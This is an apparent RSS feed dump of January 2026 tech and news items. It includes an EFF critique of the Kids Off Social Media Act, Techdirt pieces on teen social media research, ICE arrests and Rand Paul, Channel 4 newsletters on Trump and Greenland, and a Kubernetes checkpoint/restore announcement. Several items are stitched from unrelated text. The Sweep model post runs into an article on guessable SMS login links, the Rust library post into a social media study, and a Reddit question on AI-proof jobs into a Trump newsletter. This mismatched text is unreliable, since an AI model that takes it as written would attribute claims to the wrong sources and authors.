But according to Congress, Big Tech is somehow both the problem  the solution. The Senate Commerce Committee recently held a hearing on “examining the effect of technology on America’s youth.” Witnesses warned about “addictive” online content, mental health, and kids spending too much time buried in screen. At the center of the debate is a bill from Sens. Ted Cruz (R-TX) and Brian Schatz (D-HI) called the Kids Off Social Media Act (KOSMA), which they say will protect children and “empower parents.” That’s a reasonable goal, especially at a time when many parents feel overwhelmed and nervous about how much time their kids spend on screens. But while the bill’s press release contains soothing language, KOSMA doesn’t actually give parents more control. Instead of respecting how most parents guide their kids towards healthy and educational content, KOSMA hands the control panel to Big Tech. That’s right—this bill would take power away from parents, and hand it over to the companies that lawmakers say are the problem.  Kids Under 13 Are Already Banned From Social MediaOne of the main promises of KOSMA is simple and dramatic: it would ban kids under 13 from social media. Based on the language of bill sponsors, one might think that’s a big change, and that today’s rules let kids wander freely into social media sites. But that’s not the case.   Every major platform already draws the same line: kids under 13 cannot have an account. Facebook, Instagram, TikTok, X, YouTube, Snapchat, Discord, Spotify, and even blogging platforms like WordPress all say essentially the same thing—if you’re under 13, you’re not allowed. That age line has been there for many years, mostly because of how online services comply with a federal privacy law called COPPA. Of course, everyone knows many kids under 13 are on these sites anyways. The real question is how and why they get access. Most Social Media Use By Younger Kids Is Family-Mediated If lawmakers picture under-13 social media use as a bunch of kids lying about their age and sneaking onto apps behind their parents’ backs, they’ve got it wrong. Serious studies that have looked at this all find the opposite: most under-13 use is out in the open, with parents’ knowledge, and often with their direct help. A large national study published last year in  found that 63.8% of under-13s have a social media account, but only 5.4% of them said they were keeping one secret from their parents. That means roughly 90% of kids under 13 who are on social media aren’t hiding it at all. Their parents know. (For kids aged thirteen and over, the “secret account” number is almost as low, at 6.9%.) Earlier research in the U.S. found the same pattern. In a well-known study of Facebook use by 10-to-14-year-olds, researchers found that about 70% of parents said they actually helped create their child’s account, and between 82% and 95% knew the account existed. Again, this wasn’t kids sneaking around. It was families making a decision together.A 2022 study by the UK’s media regulator Ofcom points in the same direction, finding that up to two-thirds of social media users below the age of thirteen had direct help from a parent or guardian getting onto the platform. The typical under-13 social media user is not a sneaky kid. It’s a family making a decision together. KOSMA Forces Platforms To Override Families This bill doesn’t just set an age rule. It creates a legal duty for platforms to police families.Section 103(b) of the bill is blunt: if a platform knows a user is under 13, it “shall terminate any existing account or profile” belonging to that user. And “knows” doesn’t just mean someone admits their age. The bill defines knowledge to include what is “fairly implied on the basis of objective circumstances”—in other words, what a reasonable person would conclude from how the account is being used. The reality of how services would comply with KOSMA is clear: rather than risk liability for how they should have known a user was under 13, they will require all users to prove their age to ensure that they block anyone under 13. KOSMA contains no exceptions for parental consent, for family accounts, or for educational or supervised use. The vast majority of people policed by this bill won’t be kids sneaking around—it will be minors who are following their parents’ guidance, and the parents themselves. Imagine a child using their parent’s YouTube account to watch science videos about how a volcano works. If they were to leave a comment saying, “Cool video—I’ll show this to my 6th grade teacher!” and YouTube becomes aware of the comment, the platform now has clear signals that a child is using that account. It doesn’t matter whether the parent gave permission. Under KOSMA, the company is legally required to act. To avoid violating KOSMA, it would likely  lock, suspend, or terminate the account, or demand proof it belongs to an adult. That proof would likely mean asking for a scan of a government ID, biometric data, or some other form of intrusive verification, all to keep what is essentially a “family” account from being shut down.Violations of KOSMA are enforced by the FTC and state attorneys general. That’s more than enough legal risk to make platforms err on the side of cutting people off.Platforms have no way to remove “just the kid” from a shared account. Their tools are blunt: freeze it, verify it, or delete it. Which means that even when a parent has explicitly approved and supervised their child’s use, KOSMA forces Big Tech to override that family decision.Your Family, Their AlgorithmsKOSMA doesn’t appoint a neutral referee. Under the law, companies like Google (YouTube), Meta (Facebook and Instagram), TikTok, Spotify, X, and Discord will become the ones who decide whose account survives, whose account gets locked, who has to upload ID, and whose family loses access altogether. They won’t be doing this because they want to—but because Congress is threatening them with legal liability if they don’t. These companies don’t know your family or your rules. They only know what their algorithms infer. Under KOSMA, those inferences carry the force of law. Rather than parents or teachers, decisions about who can be online, and for what purpose, will be made by corporate compliance teams and automated detection systems. This debate isn’t really about TikTok trends or doomscrolling. It’s about all the ordinary, boring, parent-guided uses of the modern internet. It’s about a kid watching “How volcanoes work” on regular YouTube, instead of the stripped-down YouTube Kids. It’s about using a shared Spotify account to listen to music a parent already approves. It’s about piano lessons from a teacher who makes her living from YouTube ads.These aren’t loopholes. They’re how parenting works in the digital age. Parents increasingly filter, supervise, and, usually, decide together with their kids. KOSMA will lead to more locked accounts, and more parents submitting to face scans and ID checks. It will also lead to more power concentrated in the hands of the companies Congress claims to distrust. KOSMA also includes separate restrictions on how platforms can use algorithms for users aged 13 to 17. Those raise their own serious questions about speech, privacy, and how online services work, and need debate and scrutiny as well. But they don’t change the core problem here: this bill hands control over children’s online lives to Big Tech.If Congress really wants to help families, it should start with something much simpler and much more effective: strong privacy protections for everyone. Limits on data collection, restrictions on behavioral tracking, and rules that apply to adults as well as kids would do far more to reduce harmful incentives than deputizing companies to guess how old your child is and shut them out.But if lawmakers aren’t ready to do that, they should at least drop KOSMA and start over. A law that treats ordinary parenting as a compliance problem is not protecting families—it’s undermining them.Parents don’t need Big Tech to replace them. They need laws that respect how families actually work.]]></content:encoded></item><item><title>Show HN: Sweep, Open-weights 1.5B model for next-edit autocomplete</title><link>https://huggingface.co/sweepai/sweep-next-edit-1.5B</link><author>williamzeng0</author><category>hn</category><pubDate>Wed, 21 Jan 2026 23:22:40 +0000</pubDate><source url="https://news.ycombinator.com/shownew">HN Show</source><content:encoded><![CDATA[A 1.5B parameter model for next-edit autocomplete, quantized to Q8_0 GGUF format.Sweep Next-Edit predicts your next code edit before you make it.

To eliminate the hassle of collecting usernames and passwords—and for users to create and enter them—many such services instead require users to provide a cell phone number when signing up for an account. The services then send authentication links or passcodes by SMS when the users want to log in.A paper published last week has found more than 700 endpoints delivering such texts on behalf of more than 175 services that put user security and privacy at risk. One practice that jeopardizes users is the use of links that are easily enumerated, meaning scammers can guess them by simply modifying the security token, which usually appears at the right of a URL. By incrementing or randomly guessing the token—for instance, by first changing 123 to 124 or ABC to ABD and so on—the researchers were able to access accounts belonging to other users. From there, the researchers could view personal details, such as partially completed insurance applications.]]></content:encoded></item><item><title>Copyright Kills Competition</title><link>https://www.eff.org/deeplinks/2026/01/copyright-kills-competition</link><author>Tori Noble</author><category>tech</category><enclosure url="https://www.eff.org/files/banner_library/copyright-static.png" length="" type=""/><pubDate>Wed, 21 Jan 2026 23:14:02 +0000</pubDate><source url="https://www.eff.org/rss/updates.xml">Deeplinks</source><content:encoded><![CDATA[The DMCA’s “Anti-Circumvention” Provision]]></content:encoded></item><item><title>CRASH Clock Measures Dangerous Overcrowding in Low Earth Orbit</title><link>https://spectrum.ieee.org/kessler-syndrome-crash-clock</link><author>Margo Anderson</author><category>tech</category><enclosure url="https://spectrum.ieee.org/media-library/eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpbWFnZSI6Imh0dHBzOi8vYXNzZXRzLnJibC5tcy82Mjg3NDU5OC9vcmlnaW4uanBnIiwiZXhwaXJlc19hdCI6MTgxNjg2ODE0OX0.2qYh2P6-2plw8A54RhIlc1zgjakFz3OBXiONRL263Ao/image.jpg?width=600" length="" type=""/><pubDate>Wed, 21 Jan 2026 23:04:38 +0000</pubDate><source url="https://spectrum.ieee.org/">IEEE Spectrum</source><content:encoded><![CDATA[One solar storm could trigger a catastrophic collision in orbit]]></content:encoded></item><item><title>AMD Sends Out Linux Patches For Next-Gen EPYC Features: GLBE, GLSBE &amp; PLZA</title><link>https://www.phoronix.com/news/AMD-Linux-GLBE-GLSBE-PLZA</link><author>Michael Larabel</author><category>tech</category><pubDate>Wed, 21 Jan 2026 22:48:47 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Sent out to the Linux kernel mailing list this afternoon were a set of 19 patches in preparing for some new CPU features presumably to be found with AMD's next-generation EPYC "Venice" processors...]]></content:encoded></item><item><title>Problemo: Yet another error handling library for Rust</title><link>https://www.reddit.com/r/rust/comments/1qjcus5/problemo_yet_another_error_handling_library_for/</link><author>/u/emblemparade</author><category>rust</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 22:43:42 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[The biggest problem with Rust is that there are not enough error handling libraries... ha!But, seriously, after trying all the popular ones and some of the niche ones in large, complex projects I found myself unsatisfied (and tired).

It’s U-shaped. Perhaps most surprisingly, kids who use social media moderately have the  outcomes. Kids who use it excessively have worse outcomes. But here’s the kicker: kids who don’t use it at all  have worse outcomes.This isn’t to say that all kids should use social media. Unlike some others, we’re not saying any of this shows that social media  good or bad health outcomes. We’re pointing out that the claims of inherent harm seem not just overblown, but wrong.From the study’s key findings:A U-shaped association emerged where moderate social media use was associated with the best well-being outcomes, while both no use and highest use were associated with poorer well-being. For girls, moderate use became most favorable from middle adolescence onward, while for boys, no use became increasingly problematic from midadolescence, exceeding risks of high use by late adolescence.This seems like pretty strong evidence that Haidt’s claims of inherent harm are not well-founded, and the policy proposals to ban kids entirely from social media are a bad idea. For older teenage boys, having  social media was associated with  outcomes than having too much of it. The study found that nonusers in grades 10-12 had significantly higher odds of low well-being compared to moderate users—with boys showing an odds ratio of 3.00 and girls at 1.79.Meanwhile, researchers at the University of Manchester just published a separate study in the Journal of Public Health that followed 25,000 11- to 14-year-olds over three school years. Their conclusion? Screen time spent on social media or gaming does not cause mental health problems in teenagers. At all.The study found no evidence for boys or girls that heavier social media use or more frequent gaming increased teenagers’ symptoms of anxiety or depression over the following year. Increases in girls’ and boys’ social media use from year 8 to year 9 and from year 9 to year 10 had zero detrimental impact on their mental health the following year.Zero. Not “small.” Not “modest.” Zero.The UK researchers also examined whether  kids use social media matters—active chatting versus passive scrolling. The answer? Neither appeared to drive mental health difficulties. As lead author Dr. Qiqi Cheng put it:We know families are worried, but our results do not support the idea that simply spending time on social media or gaming leads to mental health problems – the story is far more complex than that.The Australian researchers, to their credit, are appropriately cautious about causation:While heavy use was associated with poorer well-being and abstinence sometimes coincided with less favorable outcomes, these findings are observational and should be interpreted cautiously.But while researchers urge caution, politicians have been happy to sprint ahead.The entire premise of Australia’s ban—and similar proposals floating around in various US states and across Europe—is that social media is inherently harmful to young people, and that removing access is protective. But both studies suggest the reality is far more complicated. The Australian researchers explicitly call this out:Social media’s association with adolescent well-being is complex and nonlinear, suggesting thatabstinence and excessive use can be problematic depending on developmental stage and sex.In other words: Australia’s ban may be taking kids who would have been moderate users with good outcomes and forcing them into the “no use” category that the study associates with  well-being. It’s potentially the worst of all possible policy outcomes.The UK study’s co-author, Prof. Neil Humphrey, reinforced this point:Our findings tell us that young people’s choices around social media and gaming may be shaped by how they’re feeling but not necessarily the other way around. Rather than blaming technology itself, we need to pay attention to what young people are doing online, who they’re connecting with and how supported they feel in their daily lives.That’s a crucial distinction that the moral panic crowd keeps glossing over: correlation running in the opposite direction than assumed. Kids who are already struggling, and who aren’t getting the support they need, might use social media differently—not the other way around.This shouldn’t be surprising to anyone who has been paying attention. We’ve covered study after study showing that the relationship between social media and teen mental health is complicated, context-dependent, and nowhere near as clear-cut as Haidt’s “The Anxious Generation” would have you believe. As we’ve noted before, correlation is not causation, and the timing of teen mental health declines doesn’t actually line up neatly with smartphone adoption the way the narrative claims.But nuance doesn’t make for good headlines or popular books. “Social Media Is Complicated And The Effects Depend On How You Use It, Your Age, Your Sex, And A Bunch Of Other Factors” doesn’t quite have the same ring as “Smartphones Destroyed A Generation.”No one’s beating down my door to write a book detailing the trade-offs and nuances. Instead, Haidt’s book remains on the NY Times’ best seller list almost two years after being published.The Australian study also highlights something else that should be obvious but apparently needs repeating: social media serves genuine social functions for teenagers. Being completely cut off from the platforms where your peers are socializing, sharing, and connecting has costs. The researchers note:Heavy use has been associated with distress, while abstinence may cause missed connections.This is what we’ve been saying forever. These platforms aren’t just “distraction machines” or “attention hijackers” or whatever scary framing is popular this week. They’re where social life happens for a lot of young people. Cutting kids off entirely doesn’t return them to some idyllic pre-digital social existence. It cuts them off from their actual social world.Both sets of researchers make the same point: online experiences aren’t inherently harmless—hurtful messages, online pressures, and extreme content can have real effects. But blunt instruments like time-based restrictions or outright bans completely miss the target, and are unlikely to help those who need it most. The Australian authors recommend “promotion of balanced and purposeful digital engagement as part of a broader strategy.”That’s… actually sensible policy advice? Based on actual evidence?Maybe—just maybe—they should look at the actual research coming out of Australia and the UK instead.]]></content:encoded></item><item><title>What are the top 5 safe, high-paying jobs that AI is unlikely to replace over the next few decades?</title><link>https://www.reddit.com/r/artificial/comments/1qj91oh/what_are_the_top_5_safe_highpaying_jobs_that_ai/</link><author>/u/Curious_Suchit</author><category>ai</category><category>reddit</category><pubDate>Wed, 21 Jan 2026 20:21:15 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[As AI continues to automate routine and analytical tasks, many roles will evolve or disappear.

This time round things are different – Donald Trump has been unleashed.They used to say that to understand this president’s leadership, you needed to take him seriously but not literally. Trump-watchers in 2025 and now 2026 have now modified that thought to a new ubiquitous idea, that he must now be taken both seriously and literally.Changing American societyAnd with that in mind, perhaps we shouldn’t be shocked by what has unfolded. After all, Trump laid out all his plans in great detail on day 1 of this presidency. On January 20, 2025, he signed more executive orders than at any time in US history; seizing presidential power as he changed American society with each stroke of the pen.The centrepiece was a crackdown on immigration, declaring in a number of different orders, a “national emergency”, closing the door to almost all asylum seekers (bar a few thousand white South Africans), instigating travel bans, ramping up ICE raids, and promising to tackle an “invasion” by “illegal aliens”.He told us that he wanted to end government diversity programmes, recognise only two genders – male and female, take a chainsaw to federal government and close down the world’s biggest aid agency, USAID. And he delivered every one of those promises.Rewriting the world orderIt was also on day 1 that the US administration – through an executive order – designated drug cartels as terrorists, setting off the policy that has resulted in dozens of boat strikes, and the audacious operation that saw the US seize former Venezuelan leader, Nicolas Maduro.Covering all of this for Channel 4 News has been jaw-dropping at times, as we travelled from the UN General Assembly in New York – where Trump told the world he considered climate change a hoax – to Trinidad and Tobago – where we were told about bodies from boat strikes washing up onto the shores, to Utah after the killing of conservative activist Charlie Kirk – and to Minneapolis, more than once.How Minnesota became a flashpointPerhaps it was there – in Minnesota’s largest city – that we felt the impact of Trump’s policies and words most viscerally. After he attacked Somalis in the city (all 100,000 because of a fraud case involving a few dozen) – we met Saida Hassan, working at her mother’s restaurant. Trump said he wanted Somalis to “go back to where they came from”, and some of his supporters echoed that sentiment in call after call to Hassan’s family business. I watched as she answered the phone to one man, who told this mother that he would come to Minneapolis to kill her and her family.Then, after Renee Nicole Good was shot dead by an ICE agent in the same city, we heard from Maimuna Mohamud, another mother-of-three, who was stopped by dozens of immigration officers and taken to a Minnesota prison for two weeks, despite legally residing in the country.Hearing from Trump on Monday – in a rambling speech to mark the one year anniversary – it was clear that these scenes are an unfortunate side effect of his agenda; but are the images he wants to define his presidency.His attacks on Somali Americans are stomach-churning in their vitriol.Minnesota has fewer undocumented immigrants than Florida and Texas, but to Trump it represents a flashpoint through which he can set his administration against Democratic states.As Trump told us himself – he views this as a war – against the “enemy within”. And the differing responses to Good’s killing underlined the levels of polarisation in the US. It felt as if Americans were literally watching different videos, no longer able to see the world through each other’s eyes.These acts all represent a consolidation of executive power that is unprecedented in the US. Trump’s White House has seized control, marginalising the influence of the other two branches of the constitution – Congress and the judiciary.Despite claiming on day 1 – in an executive order – that he would end the weaponisation of the federal government, Trump has run an administration with retribution at its heart.His political enemies from James Comey to John Bolton, Lisa Cook and Jerome Powell have faced federal investigations, while revenge was also how he has framed the Minnesota attacks, warning the state that a “reckoning” and “retribution” was coming.Perhaps the one reassuring fact for his critics is that so much of this has been done by a stroke of a pen, and not through deeper, longer-lasting legislative change.But even so, will the next US leader – having seen what is possible – really want to wind back the clock?Or has Trump changed his country, and the White House, for good?Davos showdown: How Trump triggered the worst transatlantic crisis in generationsWas Greenland ever just a punchline? Is Donald Trump now reshaping the Western alliance itself, one shock move at a time? He’s finally ruled out taking Greenland by force – but he wants to own it – and won’t take no for an answer. What happens if Europe refuses to bend? And is the damage already done to the transatlantic order as we know it?From an unprecedented showdown at Davos to record-breaking executive orders that have rewritten America’s map, Anushka Asthana and Chuck Todd break down a week that has left Washington, London Brussels and now the snowy mountains of Switzerland reeling.In our latest TrumpWord podcast, they examine Trump’s fixation on Greenland, the new ‘Donroe’ Doctrine taking hold inside the White House, and the rising influence of Stephen Miller as the architect of Trump’s most aggressive foreign policy gambits.Thanks for reading Channel 4 News’ weekly TrumpWorld newsletter, where our experienced correspondents take you inside the chaos, drama and consequences of Donald Trump’s America.]]></content:encoded></item><item><title>Greenland: What we learned from Trump’s Davos speech</title><link>https://www.channel4.com/news/greenland-what-we-learned-from-trumps-davos-speech</link><author>Georg von Harrach</author><category>news</category><pubDate>Wed, 21 Jan 2026 19:20:39 +0000</pubDate><source url="https://www.channel4.com/news">Channel 4</source><content:encoded><![CDATA[“People thought I would use force. I don’t have to use force, I don’t want to use force, I won’t use force,” Trump announced.But his lust for Greenland has not subsided and he made it clear he remains determined to purchase what he called the “big piece of ice”.“I’m seeking immediate negotiations to once again discuss the acquisition of Greenland by the United States,” Trump said.You’re reading the latest edition of FourGround, a bespoke newsletter brought to you by Channel 4 News’ experienced journalists reporting on the ground from locations across the world. Strategic importance of GreenlandGreenland is an autonomous territory of the Kingdom of Denmark. Both have repeatedly ruled out handing it over to the US.But Trump insists that Greenland is strategically vital for the US and nothing short of ownership will do.“If there is a war, much of the action will take place on that piece of ice,” he said in the speech in Davos.“Think of it, those missiles will be flying right over the centre of that piece of ice.”Under American control, Greenland would be protected by a “golden dome”, Trump said, perhaps part of his sales pitch to Denmark and Greenlanders.Reacting to Trump’s speech, Danish Foreign Minister Lars Løkke Rasmussen said a promise not to use force was not an end to the crisis between Europe and the US.“In isolation it’s positive that the president says what he does regarding the military, but that does not make the problem go away,” Rasmussen said.“It’s clear from this speech that the president’s ambition is intact.”Swedish Deputy Prime Minister Ebba Busch said Trump’s address was “in many ways not surprising”.“This once again proves the EU needs to toughen up, we need to hold the line,” Busch told the news agency, Reuters, in Davos.The US President’s rhetoric over Greenland escalated last weekend when Trump announced plans to impose tariffs on countries who had shown most support to Denmark.Germany, Sweden, Norway, Finland, the Netherlands and France have sent military personnel to Greenland in a limited deployment, while the UK has contributed one officer.European allies said the “reconnaissance” force was part of “a planned Arctic Endurance exercise”.France has now called for a Nato operation in Greenland. President Macron’s office said that France was prepared to contribute to such a force.Having ruled out military action, it is unclear whether Trump will also drop his threat to impose tariffs of up to 25 % on the eight European countries.What we learned on TuesdayAnd former Prime Minister of Denmark – and ex-Nato Secretary General – Anders Fogh Rasmussen told Channel 4 News on Tuesday that Greenland was “not for sale”, adding that his only means of Trump acquiring the island would be by “conquering it, which would of course mean the end of Nato”.Rasmussen also warned that Trump was the “biggest threat to world peace”.Using force would mean “the future of Nato is at stake and the world order as we know it is at stake, so it is a very serious situation,” Rasmussen said.European Commission President Ursula von der Leyen said that the EU was planning “a massive European investment surge” in Greenland.Where the EU and Nato agree with Trump is in the strategic importance of the polar region where melting ice is opening up new shipping routes.“We are aligned. We are working together [with the US],” von der Leyen told MEPs in the European Parliament this morning.“We share the same strategic assessment on Arctic security. And this is why the threat of additional tariffs for security reasons is simply wrong. If we are now plunging into a dangerous downward spiral between allies, this would only embolden the very adversaries we are both so committed to keeping out of our strategic landscape.”Trump already has access to the Arctic through Alaska. It also has a military base on Greenland through a long-term existing agreement with Denmark.With temperatures dropping to minus 20 C, close to two-thirds of the capital Kyiv is currently without power after days of Russian attacks on Ukraine’s energy infrastructure.Trump insisted today that he is set on ending the war and would put pressure on both sides.A deal is now “reasonably close,” he promised.Trump is due to meet with Ukrainian President Volodymyr Zelenskyy on Thursday.Thanks for reading the latest edition of our free FourGround newsletter. Subscribe to keep up to date with Channel 4 News on Substack.]]></content:encoded></item><item><title>The Biggest Frenzy of All Life on Earth | How Nature Works | BBC Earth Science</title><link>https://www.youtube.com/watch?v=p0EsKdRvMQw</link><author>BBC Earth Science</author><category>yt</category><enclosure url="https://www.youtube.com/v/p0EsKdRvMQw?version=3" length="" type=""/><pubDate>Wed, 21 Jan 2026 19:01:02 +0000</pubDate><source url="https://www.youtube.com/channel/UCdsOTr6SmDrxuWE7sJFrkhQ">BBC Earth Science</source><content:encoded><![CDATA[Phytoplankton blooms are extremely important for all oceanic life on planet Earth but what role to they play in human's lives?

Do you still want to pretend ICE efforts are targeting “the worst of the worst?” Are you just going to sit there and mumble some incomprehensible stuff about “respecting the laws?”Go ahead. Do it, you cowards. This is  what you voted for, even if it now makes you a bit queasy. Just sit there and soak in it. You  who you support, even if you never thought it would go this far.“Worst of the worst,” Trump’s parrot repeat on blast. “This one time we caught a guy who did actual crimes,” say spokespeople defending whatever the latest hideous violation of the social contract (if not actual constitutional rights) a federal agent has performed. “Targeted investigation/stop” say the enablers, even when it’s just officers turning white nationalism into Official Government Policy. “Brown people need to be gone” is the end game. Full stop.Here’s where we’re at in Minnesota, where ICE officers are being shamed into retreat on the regular, punctuated by the occasional revenge killing of mouthy US citizens. Federal agents detained three workers from a family-owned Mexican restaurant in Willmar, Minn., on Jan. 15, hours after four agents ate lunch there.Does that seem innocuous? Does this seem like some plausible deniability is in play here? Well, disabuse yourself of those notions. This is how it went down.The arrest happened around 8:30 p.m. near a Lutheran church and Willmar Middle School as agents followed the workers after they closed up for the night. A handful of bystanders blew whistles and shouted at agents as they detained the people. “Would your mama be proud of you right now?” one of the bystanders asked.Nice. Is this what you want from a presidential administration? Or would you rather complain ICE officers have been treated unfairly if people refuse to feed or house them, knowing full well that doing either of these things will turn their employees into targets. An eyewitness who declined to give a name for fear of retribution, told the Minnesota Star Tribune that four ICE agents sat in a booth for a meal at El Tapatio restaurant a little before 3 p.m. Staff at the restaurant were frightened, said the eyewitness, who shared pictures from the restaurant as well as video of the arrest.I’m not saying ICE officers shouldn’t be able to eat at ethnic restaurants. I am, however, saying that they definitely  because everyone is going to think the officers are there for  but the food. And I do believe any minority business owner should be able to refuse service to ICE officers who wander in under the pretense of buying a meal. The end result is going to be the same whether or not you decide to engage with this pretense. You’re getting raided either way. May as well deny them the meal.El Tapatio Mexican Restaurant closed after WCCO confirmed agents visited the spot for lunch and later returned, detaining its owners and a dishwasher nearby after they had closed early due to the federal law enforcement’s previous appearance.And here’s the DHS statement, which pretends ICE officers didn’t eat a meal at a restaurant and then return a few hours later to detain employees when they left the building: “On January 14, ICE officers conducted surveillance of a target, an illegal alien from Mexico. Officers observed that the target’s vehicle was outside of a local business and positively identified him as the target while inside the business. Following the positive identification of the target, officers then conducted a vehicle stop later in the day and apprehended the target and two additional illegal aliens who were in the car, including one who had a final order of removal from an immigration judge.”Nope. I don’t care what the ICE apologists will say about this. These narratives have places where they overlap but it’s impossible to believe this went down exactly like the government said it did. These officers picked out an ethnic restaurant, were served by an intimidated staff, and then hung around to catch any stragglers leaving the business that previously had graciously served them, despite the threat they posed.Abolish ICE. It’s no longer just a catchy phrase to shout during protests. It’s an imperative. If we don’t stop it now, it will only become even worse and even more difficult to remove. Treat ICE like the tumor it is. Pretending its MRSA gives it more power than it should ever be allowed to have. ]]></content:encoded></item><item><title>Daily Deal: PiCar-X Smart Video Robot Car Kit for Raspberry Pi 4</title><link>https://www.techdirt.com/2026/01/21/daily-deal-picar-x-smart-video-robot-car-kit-for-raspberry-pi-4-3/</link><author>Daily Deal</author><category>tech</category><pubDate>Wed, 21 Jan 2026 18:50:20 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Dive into the world of robotics, programming, and electronics with the PiCar-X, an engaging and versatile smart car designed for learners from elementary school to advanced hobbyists.

Today we would like to announce the new Kubernetes Checkpoint Restore WG focusing on the integration of Checkpoint/Restore functionality into Kubernetes.There are several high-level scenarios discussed in the working group:Optimizing resource utilization for interactive workloads, such as Jupyter notebooks and AI chatbotsAccelerating startup of applications with long initialization times, including Java applications and LLM inference servicesUsing periodic checkpointing to enable fault-tolerance for long-running workloads, such as distributed model trainingProviding interruption-aware scheduling with transparent checkpoint/restore, allowing lower-priority Pods to be preempted while preserving the runtime state of applicationsFacilitating Pod migration across nodes for load balancing and maintenance, without disrupting workloads.Enabling forensic checkpointing to investigate and analyze security incidents such as cyberattacks, data breaches, and unauthorized access.Across these scenarios, the goal is to help facilitate discussions of ideas between the Kubernetes community and the growing Checkpoint/Restore in Userspace (CRIU) ecosystem. The CRIU community includes several projects that support these use cases, including:CRIU - A tool for checkpointing and restoring running applications and containerscheckpointctl - A tool for in-depth analysis of container checkpointscriu-coordinator - A tool for coordinated checkpoint/restore of distributed applications with CRIUMore information about the checkpoint/restore integration with Kubernetes is also available here.If you are interested in contributing to Kubernetes or CRIU, there are several ways to participate:]]></content:encoded></item><item><title>How the U.S. Crackdown Is Strangling Venezuela’s Dark Fleet | WSJ</title><link>https://www.youtube.com/watch?v=WJSJOiYzHRM</link><author>The Wall Street Journal</author><category>yt</category><enclosure url="https://www.youtube.com/v/WJSJOiYzHRM?version=3" length="" type=""/><pubDate>Wed, 21 Jan 2026 17:57:03 +0000</pubDate><source url="https://www.youtube.com/channel/UCK7tptUDHh-RYDsdxO1-5QQ">The Wall Street Journal</source><content:encoded><![CDATA[Over 1400 so-called dark fleet ships from Venezuela, Iran and Russia have been sanctioned or blacklisted by Western countries in recent years, with little impact until the current ramp up in U.S. enforcement.

The main issue I had with it was that testing a deployment on say staging involves pushing to git main in order to get argo to apply my changes. I'm trying to avoid using labels. I know there's patterns that use that, but if the data is not in git to me that defeats the point. So I looked and a few GitOps solutions and Kargo seemed to be the most interesting one. The basic flow seems to be pretty slick. Watch for changes (Warehouse), creates a change-set (Freight) and Promote the change to the given Stage. The main thing that seems to be missing is applying a diff for a given environment that has both a version change AND a config change. So say I have a new helm chart with some breaking changes. I'd like to configure some values.yaml changes for say staging and update to version 2.x and promote those together to staging. If that works, It would be nice to apply the diff to prod, then staging, etc. It feels like Kargo only supports artifacts without say git/config changes. How do people manage this? If I have to do a PR for each env that won't be reflected till they get merged, then you might as well just update the version in your PR. The value add of kargo seems pretty minor at that point.Am I missing something? How to you take a change and promote it through various stages? Right now I'm just committing to main since everything is staging still but that doesn't seem like a proper pattern. ]]></content:encoded></item><item><title>Rand Paul Only Wants Google To Be The Arbiter Of Truth When The Videos Are About Him</title><link>https://www.techdirt.com/2026/01/21/rand-paul-only-wants-google-to-be-the-arbiter-of-truth-when-the-videos-are-about-him/</link><author>Mike Masnick</author><category>tech</category><pubDate>Wed, 21 Jan 2026 17:29:51 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Just a year and a half ago, Senator Rand Paul sponsored a bill that would make it illegal for federal government employees to ask internet companies to remove any speech. Now, in a NY Post op-ed, Paul proudly announces that he did exactly that—formally contacting Google executives to demand they remove a video he didn’t like.The video apparently (falsely) claims Paul took money from Nicolas Maduro, the former Venezuelan President the US recently kidnapped. And Paul is furious that YouTube wouldn’t take it down for him.But the straw that broke the camel’s back came this week when I notified Google executives that they were hosting a video of a woman posing as a newscaster posing in a fake news studio explaining that “Rand Paul is taking money from the Maduro regime.”I’ve formally notified Google that this video is unsupported by facts, defames me, harasses me and now endangers my life.Google responded that they don’t investigate the truth of accusations . . . and refused to take down the video.Let’s pause here. Senator Paul—a sitting U.S. Senator—”formally notified” Google executives that they needed to remove content. Under  proposed legislation, that would be illegal. His bill was explicitly designed to prevent government officials from pressuring platforms about speech. And yet here he is, doing exactly that.This is also notably closer to actual government jawboning than most of what the Biden administration was accused of in the  case—where the Supreme Court found no First Amendment violation because platforms felt free to say no. Paul, a Senator with legislative power over these companies, is “formally notifying” them of what he wants removed, and is now saying that Google’s refusal to do so means they should lose Section 230 protection. Remember, the “smoking gun” in the Murthy case was supposedly Biden officials (and Biden himself) threatening to remove Section 230 if the tech platforms didn’t remove content they didn’t like.Rand Paul was furious about that and his bill was supposedly in direct response to the Murthy ruling, in which he wanted to make it clear that (1) no government official should ever demand content be taken down and (2) threatening to pass legislation to punish companies for their refusal to moderate content would also violate the law.And here he’s doing both.But it gets worse. Buried in the third-to-last paragraph of Paul’s op-ed is this remarkable admission:Though Google refused to remove the defamatory content, the individual who posted the video finally took down the video under threat of legal penalty.Wait. So the system worked exactly as designed? Paul threatened legal action against the person who actually created the content, and they took it down? That’s… that’s the whole point of Section 230. Liability attaches to the speaker, not the host. The creator is responsible. And when threatened with actual legal consequences, they removed the video.So what, exactly, is Paul complaining about?!? He got the outcome he wanted through the mechanism that Section 230 preserved for him: the ability to bring legal action against the speaker. But instead of acknowledging that the law worked, he’s using this as his justification for destroying it.Paul is a public figure. He has access to pretty much all the media he wants. If he wanted to use the famous “marketplace of ideas” he so frequently invokes to debunk a nonsense lie about him and Maduro, he was free to do that. If the video was actually defamatory, he could sue the creator—which he apparently threatened to do, and it worked! Instead, he wants to tear down the entire legal framework because YouTube wouldn’t do his bidding, even though the video was already taken down.The Arbiter of Truth HypocrisyHere’s where Paul’s position becomes truly incoherent.I asked one of Google’s executives what happens to the small town mayor whose enemies maliciously and without evidence, post that he is a pedophile on YouTube?. Would that be OK?The executive responded that YouTube does not monitor their content for truth. But how would that small town mayor ever get his or her reputation back?Just a few years ago, Rand Paul was apoplectic that YouTube tried to determine whether content—specifically about COVID-19—was true or not. He thought it was terrible that YouTube would dare to be the arbiter of truth, and he whined about it at length.Now he’s demanding they be the arbiter of truth and remove one video because  says it’s false.Paul even acknowledges this contradiction in his own op-ed, apparently without realizing it:Interestingly, Google says it doesn’t assess the truth of the content it hosts, but throughout the pandemic they removed content that they perceived as untrue, such as skepticism toward vaccines, 